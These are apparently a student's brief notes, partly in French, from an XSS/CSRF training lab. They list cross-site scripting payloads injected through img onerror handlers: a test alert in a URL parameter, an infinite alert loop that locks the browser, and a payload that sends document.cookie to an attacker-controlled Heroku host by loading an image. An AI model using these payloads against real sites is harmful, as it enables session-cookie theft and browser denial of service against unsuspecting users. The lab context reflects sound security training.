https://xss-csrf-tp.herokuapp.com/level/1?page=%3Cimg%20src=%27dzqjidqi.jpg%27%20onerror=alert(%27test%27)%3E%3C/img%3E

<img src='dqd.jpg' onerror= alert('xss') ></img> dans title
Le script ne fonctionne ne pas car il a été correctement géré coté serveur.
Les
<img src='zzz.jpg' onerror=while(true)alert('xss') ></img>
<img src='zzz.jpg' onerror="var addr = 'https://my-malicious-ws-maisonhaute.herokuapp.com/' + document.cookie; var imgTag = document.createElement('img') ; imgTag.setAttribute('src', addr); document.body.appendChild(imgTag);" ></img>
